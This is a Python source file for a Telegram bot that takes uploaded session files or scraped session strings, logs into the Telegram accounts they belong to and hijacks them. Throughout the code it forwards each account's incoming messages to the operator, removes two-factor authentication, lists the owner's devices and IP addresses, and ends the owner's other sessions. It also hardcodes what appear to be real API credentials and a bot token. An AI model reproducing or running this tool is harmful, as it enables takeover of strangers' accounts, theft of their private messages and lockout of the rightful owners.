import os
import asyncio
import tempfile
import shutil
import re
import json
import tarfile
import zipfile
import magic
import rarfile
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import Message, ContentType, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import ApiIdInvalidError, AccessTokenInvalidError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.types import Authorization

# ========== DEFAULT CONFIG ==========
DEFAULT_API_ID = 20598937
DEFAULT_API_HASH = "0c3a9153ca8295883665459e4c22c674"
DEFAULT_BOT_TOKEN = "8434544662:AAGGSbiMBkNsz7pPd4U_prQAipDgC00NvTg"
DEFAULT_ADMIN_ID = 7632476151
# ============================

CONFIG_FILE = "bot_config.json"
SESSIONS_DIR = "sessions"

if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

# Load or create config
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    
    # Create default config
    default_config = {
        "api_id": DEFAULT_API_ID,
        "api_hash": DEFAULT_API_HASH,
        "bot_token": DEFAULT_BOT_TOKEN,
        "admin_id": DEFAULT_ADMIN_ID
    }
    save_config(default_config)
    return default_config

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

# Load initial config
config = load_config()

# Initialize bot with config
bot = Bot(token=config["bot_token"])
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Store active Telethon clients and their info
clients = {}
client_info = {}  # Store additional client info like phone number, user_id, etc.

# FSM States for admin panel
class ConfigStates(StatesGroup):
    waiting_api_id = State()
    waiting_api_hash = State()
    waiting_bot_token = State()
    waiting_admin_id = State()

# --- Utilities ------------------------------------------------
def safe_name(name: str) -> str:
    """Make a file-system safe name."""
    return re.sub(r'[^A-Za-z0-9_.-]', '_', name)

def extract_archive(file_path: str, dest_dir: str):
    """Extract common archive types (zip, tar, rar) into dest_dir."""
    try:
        if zipfile.is_zipfile(file_path):
            with zipfile.ZipFile(file_path, 'r') as z:
                z.extractall(dest_dir)
            return True
        if tarfile.is_tarfile(file_path):
            with tarfile.open(file_path, 'r:*') as t:
                t.extractall(dest_dir)
            return True
        try:
            if rarfile.is_rarfile(file_path):
                with rarfile.RarFile(file_path) as r:
                    r.extractall(dest_dir)
                return True
        except rarfile.Error:
            pass
    except Exception as e:
        print("Extract error:", e)
    return False

def find_session_files(root_dir: str):
    """Find .session files and similar in a folder."""
    found = []
    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            if fn.lower().endswith('.session') or 'session' in fn.lower():
                found.append(('file', os.path.join(dirpath, fn), fn))
    return found

BASE64_RE = re.compile(r'([A-Za-z0-9+/=_\-]{80,})')

def find_string_sessions_in_text(root_dir: str):
    """Find string session tokens inside text/JSON files."""
    found = []
    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            full = os.path.join(dirpath, fn)
            try:
                mtype = magic.from_file(full, mime=True)
                if not mtype or not mtype.startswith('text'):
                    continue
                with open(full, 'r', errors='ignore') as f:
                    txt = f.read()
                try:
                    j = json.loads(txt)
                    for key in ['string_session', 'session', 'session_string', 'auth']:
                        if key in j and isinstance(j[key], str) and len(j[key]) > 50:
                            found.append(('string', j[key], f"{fn}:{key}"))
                except Exception:
                    pass
                for m in BASE64_RE.findall(txt):
                    if len(m) > 80:
                        found.append(('string', m, f"{fn}:token"))
            except Exception:
                continue
    return found

async def get_client_info(client, session_name: str):
    """Get client information like phone, user_id, etc."""
    try:
        me = await client.get_me()
        client_info[session_name] = {
            'phone': me.phone,
            'user_id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name
        }
        return client_info[session_name]
    except Exception as e:
        print(f"Error getting client info for {session_name}: {e}")
        return None

async def send_account_buttons(chat_id: int, session_name: str, client_info: dict):
    """Send management buttons for a successful account login."""
    phone = client_info.get('phone', 'Unknown')
    username = client_info.get('username', 'No username')
    first_name = client_info.get('first_name', 'Unknown')
    
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔓 Remove 2FA", callback_data=f"remove_2fa:{session_name}")],
        [types.InlineKeyboardButton(text="📱 Show Devices", callback_data=f"show_devices:{session_name}")],
        [types.InlineKeyboardButton(text="🚪 Terminate Other Sessions", callback_data=f"terminate_others:{session_name}")]
    ])
    
    message_text = (
        f"✅ Account Login Successful!\n\n"
        f"📱 Phone: `{phone}`\n"
        f"👤 Name: {first_name}\n"
        f"🔗 Username: @{username}\n"
        f"📛 Session: `{session_name}`\n\n"
        f"Choose management option:"
    )
    
    await bot.send_message(chat_id, message_text, reply_markup=keyboard, parse_mode="Markdown")

async def start_telethon_from_file(session_path: str, session_name: str):
    """Start Telethon client from a .session file."""
    dest_base = os.path.join(SESSIONS_DIR, safe_name(session_name))
    try:
        shutil.copy(session_path, dest_base + '.session')
    except Exception as e:
        print("Copy session failed:", e)
        return False

    try:
        client = TelegramClient(dest_base, config["api_id"], config["api_hash"])
        await client.start()
        
        # Get client info
        info = await get_client_info(client, session_name)
        
        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            try:
                sender = await event.get_sender()
                sender_name = sender.username or (sender.first_name or "Unknown")
                text = event.message.message or ''
                
                if text:
                    # Send to admin
                    out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
                    await bot.send_message(config["admin_id"], out)
                    
            except Exception as ee:
                print(f"Handler error: {ee}")

        clients[session_name] = client
        
        # Send account management buttons
        if info:
            await send_account_buttons(config["admin_id"], session_name, info)
        
        print(f"Started session (file): {session_name}")
        return True
    except ApiIdInvalidError as e:
        error_msg = f"❌ API ID/Hash Error for session {session_name}: {e}"
        print(error_msg)
        await bot.send_message(config["admin_id"], error_msg)
        return False
    except Exception as e:
        print(f"Start client from file failed: {e}")
        return False

async def start_telethon_from_string(session_string: str, session_name: str):
    """Start Telethon client from a StringSession."""
    try:
        ss = StringSession(session_string)
        client = TelegramClient(ss, config["api_id"], config["api_hash"])
        await client.start()
        
        # Get client info
        info = await get_client_info(client, session_name)
        
        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            try:
                sender = await event.get_sender()
                sender_name = sender.username or (sender.first_name or "Unknown")
                text = event.message.message or ''
                
                if text:
                    # Send to admin
                    out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
                    await bot.send_message(config["admin_id"], out)
                    
            except Exception as ee:
                print(f"Handler error: {ee}")

        clients[session_name] = client
        
        # Send account management buttons
        if info:
            await send_account_buttons(config["admin_id"], session_name, info)
        
        print(f"Started session (string): {session_name}")
        return True
    except ApiIdInvalidError as e:
        error_msg = f"❌ API ID/Hash Error for session {session_name}: {e}"
        print(error_msg)
        await bot.send_message(config["admin_id"], error_msg)
        return False
    except Exception as e:
        print(f"Start client from string failed: {e}")
        return False

# Account management functions
async def remove_2fa(client, session_name: str):
    """Remove 2FA from account."""
    try:
        # Try to disable 2FA by setting empty password
        await client.edit_2fa(new_password='')
        return True, "✅ 2FA removed successfully"
    except Exception as e:
        try:
            # Alternative method
            await client.reset_2fa()
            return True, "✅ 2FA reset successfully"
        except Exception as e2:
            return False, f"❌ Failed to remove 2FA: {str(e)}"

async def get_active_devices(client, session_name: str):
    """Get list of active devices/sessions."""
    try:
        authorizations = await client(GetAuthorizationsRequest())
        devices = []
        
        for auth in authorizations.authorizations:
            device_info = {
                'hash': auth.hash,
                'device_model': auth.device_model or 'Unknown',
                'platform': auth.platform or 'Unknown',
                'system_version': auth.system_version or 'Unknown',
                'api_id': auth.api_id,
                'app_name': auth.app_name or 'Unknown',
                'app_version': auth.app_version or 'Unknown',
                'date_created': auth.date_created.strftime('%Y-%m-%d %H:%M:%S'),
                'date_active': auth.date_active.strftime('%Y-%m-%d %H:%M:%S'),
                'ip': auth.ip,
                'country': auth.country,
                'current': auth.current
            }
            devices.append(device_info)
        
        return True, devices
    except Exception as e:
        return False, f"❌ Failed to get devices: {str(e)}"

async def terminate_other_sessions(client, session_name: str):
    """Terminate all other active sessions except current one."""
    try:
        # Reset all other authorizations
        await client(ResetAuthorizationsRequest())
        return True, "✅ All other sessions terminated successfully"
    except Exception as e:
        return False, f"❌ Failed to terminate other sessions: {str(e)}"

# ========== Bot Handlers ==========
@router.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id != config["admin_id"]:
        return
    await message.reply(
        "✅ Session manager ready.\n\n"
        "Available commands:\n"
        "/start - Show this message\n"
        "/panel - Admin configuration panel\n"
        "/list - Show active sessions\n"
        "/stop - Stop all sessions\n"
        "/outall - Logout all accounts\n"
        "/logout <name> - Logout specific session\n"
        "/devices <name> - Show devices for session\n\n"
        "Send me .session / zip / tar / rar / txt / json files and I will start the sessions automatically."
    )

@router.message(Command("panel"))
async def cmd_panel(message: Message):
    if message.from_user.id != config["admin_id"]:
        return
    
    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔧 Set API ID", callback_data="set_api_id")],
        [types.InlineKeyboardButton(text="🔑 Set API Hash", callback_data="set_api_hash")],
        [types.InlineKeyboardButton(text="🤖 Set Bot Token", callback_data="set_bot_token")],
        [types.InlineKeyboardButton(text="👑 Set Admin ID", callback_data="set_admin_id")],
        [types.InlineKeyboardButton(text="📊 Current Config", callback_data="show_config")],
        [types.InlineKeyboardButton(text="🔄 Reload Bot", callback_data="reload_bot")]
    ])
    
    await message.reply("🛠️ Admin Configuration Panel", reply_markup=keyboard)

@router.callback_query(lambda c: c.data.startswith('set_') or c.data in ['show_config', 'reload_bot'])
async def process_config_callback(callback_query: types.CallbackQuery, state: FSMContext):
    if callback_query.from_user.id != config["admin_id"]:
        await callback_query.answer("❌ Access denied")
        return
    
    data = callback_query.data
    
    if data == "set_api_id":
        await callback_query.message.answer("Please send your new API ID:")
        await state.set_state(ConfigStates.waiting_api_id)
    
    elif data == "set_api_hash":
        await callback_query.message.answer("Please send your new API Hash:")
        await state.set_state(ConfigStates.waiting_api_hash)
    
    elif data == "set_bot_token":
        await callback_query.message.answer("Please send your new Bot Token:")
        await state.set_state(ConfigStates.waiting_bot_token)
    
    elif data == "set_admin_id":
        await callback_query.message.answer("Please send your new Admin ID:")
        await state.set_state(ConfigStates.waiting_admin_id)
    
    elif data == "show_config":
        current_config = load_config()
        config_text = (
            f"📊 Current Configuration:\n\n"
            f"🔧 API ID: `{current_config['api_id']}`\n"
            f"🔑 API Hash: `{current_config['api_hash']}`\n"
            f"🤖 Bot Token: `{current_config['bot_token'][:10]}...`\n"
            f"👑 Admin ID: `{current_config['admin_id']}`\n"
            f"🔌 Active Sessions: `{len(clients)}`"
        )
        await callback_query.message.answer(config_text, parse_mode="Markdown")
    
    elif data == "reload_bot":
        global bot
        try:
            await bot.session.close()
            bot = Bot(token=config["bot_token"])
            await callback_query.message.answer("✅ Bot reloaded with new configuration!")
        except Exception as e:
            await callback_query.message.answer(f"❌ Error reloading bot: {e}")
    
    await callback_query.answer()

# Account management callbacks
@router.callback_query(lambda c: c.data.startswith(('remove_2fa:', 'show_devices:', 'terminate_others:')))
async def process_account_management(callback_query: CallbackQuery):
    if callback_query.from_user.id != config["admin_id"]:
        await callback_query.answer("❌ Access denied")
        return
    
    data_parts = callback_query.data.split(':', 1)
    action = data_parts[0]
    session_name = data_parts[1]
    
    client = clients.get(session_name)
    if not client:
        await callback_query.answer("❌ Session not found")
        return
    
    await callback_query.answer("⏳ Processing...")
    
    try:
        if action == "remove_2fa":
            success, message = await remove_2fa(client, session_name)
            await callback_query.message.answer(f"🔓 2FA Removal - {session_name}\n\n{message}")
            
        elif action == "show_devices":
            success, result = await get_active_devices(client, session_name)
            if success:
                devices_text = "📱 Active Devices:\n\n"
                for i, device in enumerate(result, 1):
                    current_indicator = " ✅ CURRENT" if device['current'] else ""
                    devices_text += (
                        f"{i}. **{device['device_model']}**\n"
                        f"   📱 {device['platform']} {device['system_version']}\n"
                        f"   🔧 {device['app_name']} {device['app_version']}\n"
                        f"   🌐 {device['ip']} ({device['country']})\n"
                        f"   📅 Active: {device['date_active']}{current_indicator}\n\n"
                    )
                await callback_query.message.answer(devices_text, parse_mode="Markdown")
            else:
                await callback_query.message.answer(result)
                
        elif action == "terminate_others":
            success, message = await terminate_other_sessions(client, session_name)
            await callback_query.message.answer(f"🚪 Session Termination - {session_name}\n\n{message}")
            
    except Exception as e:
        await callback_query.message.answer(f"❌ Error processing request: {str(e)}")

@router.message(Command("devices"))
async def cmd_devices(message: Message):
    """Show devices for a specific session"""
    if message.from_user.id != config["admin_id"]:
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("Usage: /devices <session_name>")
        return

    session_name = safe_name(args[1])
    client = clients.get(session_name)
    if not client:
        await message.reply(f"❌ No active session found with name: {session_name}")
        return
    
    await message.reply("⏳ Fetching device information...")
    
    success, result = await get_active_devices(client, session_name)
    if success:
        devices_text = f"📱 Active Devices for {session_name}:\n\n"
        for i, device in enumerate(result, 1):
            current_indicator = " ✅ CURRENT" if device['current'] else ""
            devices_text += (
                f"{i}. **{device['device_model']}**\n"
                f"   📱 {device['platform']} {device['system_version']}\n"
                f"   🔧 {device['app_name']} {device['app_version']}\n"
                f"   🌐 {device['ip']} ({device['country']})\n"
                f"   📅 Active: {device['date_active']}{current_indicator}\n\n"
            )
        await message.reply(devices_text, parse_mode="Markdown")
    else:
        await message.reply(result)

@router.message(ConfigStates.waiting_api_id)
async def process_api_id(message: Message, state: FSMContext):
    try:
        api_id = int(message.text)
        config["api_id"] = api_id
        save_config(config)
        await message.answer(f"✅ API ID updated to: `{api_id}`", parse_mode="Markdown")
        await state.clear()
    except ValueError:
        await message.answer("❌ Invalid API ID. Please send a valid number.")

@router.message(ConfigStates.waiting_api_hash)
async def process_api_hash(message: Message, state: FSMContext):
    api_hash = message.text.strip()
    if len(api_hash) < 10:
        await message.answer("❌ Invalid API Hash. Please send a valid hash.")
        return
    
    config["api_hash"] = api_hash
    save_config(config)
    await message.answer(f"✅ API Hash updated to: `{api_hash}`", parse_mode="Markdown")
    await state.clear()

@router.message(ConfigStates.waiting_bot_token)
async def process_bot_token(message: Message, state: FSMContext):
    bot_token = message.text.strip()
    if not bot_token.startswith('') or ':' not in bot_token:
        await message.answer("❌ Invalid Bot Token format.")
        return
    
    config["bot_token"] = bot_token
    save_config(config)
    await message.answer("✅ Bot Token updated successfully!")
    await state.clear()

@router.message(ConfigStates.waiting_admin_id)
async def process_admin_id(message: Message, state: FSMContext):
    try:
        admin_id = int(message.text)
        config["admin_id"] = admin_id
        save_config(config)
        await message.answer(f"✅ Admin ID updated to: `{admin_id}`", parse_mode="Markdown")
        await state.clear()
    except ValueError:
        await message.answer("❌ Invalid Admin ID. Please send a valid number.")

@router.message(Command("list"))
async def cmd_list(message: Message):
    if message.from_user.id != config["admin_id"]:
        return
    if clients:
        txt = "📋 Active sessions:\n\n" + "\n".join(f"• {name} - {client_info.get(name, {}).get('phone', 'Unknown')}" for name in clients)
    else:
        txt = "📋 Active sessions:\n (none)"
    await message.reply(txt)

@router.message(Command("stop"))
async def cmd_stop(message: Message):
    if message.from_user.id != config["admin_id"]:
        return
    for name, client in list(clients.items()):
        try:
            await client.disconnect()
        except:
            pass
        clients.pop(name, None)
        client_info.pop(name, None)
    await message.reply("✅ All sessions stopped.")

@router.message(Command("outall"))
async def cmd_outall(message: Message):
    """Logout all accounts from all devices"""
    if message.from_user.id != config["admin_id"]:
        return
    
    if not clients:
        await message.reply("❌ No active sessions found.")
        return
    
    success_count = 0
    fail_count = 0
    report_lines = []
    
    for name, client in list(clients.items()):
        try:
            # Logout from all devices
            await client.log_out()
            await client.disconnect()
            clients.pop(name, None)
            client_info.pop(name, None)
            success_count += 1
            report_lines.append(f"✅ {name} - Logged out from all devices")
        except Exception as e:
            fail_count += 1
            report_lines.append(f"❌ {name} - Failed: {str(e)}")
    
    report = f"📊 Logout Report:\n\nSuccess: {success_count}\nFailed: {fail_count}\n\n" + "\n".join(report_lines[:20])
    await message.reply(report)

@router.message(Command("logout"))
async def cmd_logout(message: Message):
    if message.from_user.id != config["admin_id"]:
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("Usage: /logout <session_name>")
        return

    session_name = safe_name(args[1])
    client = clients.get(session_name)
    if client:
        try:
            await client.log_out()  # Logout from all devices
            await client.disconnect()
        except:
            pass
        clients.pop(session_name, None)
        client_info.pop(session_name, None)
        await message.reply(f"✅ Logged out from all devices: {session_name}")
    else:
        await message.reply(f"❌ No active session found with name: {session_name}")

@router.message(lambda message: message.content_type == ContentType.DOCUMENT)
async def handle_document(message: Message):
    if message.from_user.id != config["admin_id"]:
        return

    doc = message.document
    fname = doc.file_name or "uploaded_file"
    safe_fname = safe_name(fname)
    saved_path = os.path.join(SESSIONS_DIR, safe_fname)

    await message.reply("📥 Upload received. Processing...")
    await bot.download(file=doc, destination=saved_path)

    tempdir = tempfile.mkdtemp(prefix="sess_extract_")
    try:
        extracted = extract_archive(saved_path, tempdir)
        if not extracted:
            shutil.copy(saved_path, os.path.join(tempdir, safe_fname))

        found_files = find_session_files(tempdir)
        found_strings = find_string_sessions_in_text(tempdir)

        report_lines = []
        started = 0
        api_errors = 0

        for ftype, fullpath, shortname in found_files:
            base_name = os.path.splitext(shortname)[0]
            ok = await start_telethon_from_file(fullpath, base_name)
            if ok:
                report_lines.append(f"✅ Started session from file: {shortname}")
                started += 1
            else:
                if "API ID/Hash Error" in str(ok):
                    api_errors += 1
                    report_lines.append(f"❌ API Error in file: {shortname}")
                else:
                    report_lines.append(f"❌ Failed to start from file: {shortname}")

        idx = 0
        for ftype, s, label in found_strings:
            idx += 1
            name = f"{safe_fname}_str_{idx}"
            ok = await start_telethon_from_string(s, name)
            if ok:
                report_lines.append(f"✅ Started session from string: {label}")
                started += 1
            else:
                if "API ID/Hash Error" in str(ok):
                    api_errors += 1
                    report_lines.append(f"❌ API Error in string: {label}")
                else:
                    report_lines.append(f"❌ Failed to start session from string: {label}")

        if api_errors > 0:
            report_lines.append(f"\n⚠️ {api_errors} sessions failed due to API ID/Hash errors. Check your configuration in /panel")

        if started == 0:
            report = "❌ No sessions found or started.\n\nDetails:\n" + "\n".join(report_lines[:10])
        else:
            report = f"✅ Started {started} session(s).\n\nDetails:\n" + "\n".join(report_lines[:50])

        await message.reply(report)
    except Exception as e:
        await message.reply(f"Error processing file: {e}")
    finally:
        try:
            shutil.rmtree(tempdir)
        except:
            pass

# ========== Run bot ==========
async def main():
    print("Bot running...")
    print(f"Admin ID: {config['admin_id']}")
    print(f"Active sessions: {len(clients)}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
